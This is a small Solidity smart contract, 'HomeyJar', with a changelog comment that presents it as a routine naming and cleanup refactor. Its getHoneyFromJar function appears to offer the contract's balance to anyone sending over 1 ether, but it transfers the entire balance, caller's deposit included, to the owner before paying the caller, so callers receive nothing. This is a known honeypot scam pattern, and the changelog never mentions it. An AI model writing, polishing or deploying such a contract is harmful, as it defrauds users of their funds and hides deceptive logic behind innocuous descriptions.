pragma solidity ^0.4.19;

contract HomeyJar {
    address public owner = msg.sender;

    function() public payable {}

    function getHoneyFromJar() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes made:
// - Changed Owner variable to owner to follow naming conventions
// - Removed unnecessary code from withdraw function
// - Added require statement to check if low level call in command function returns true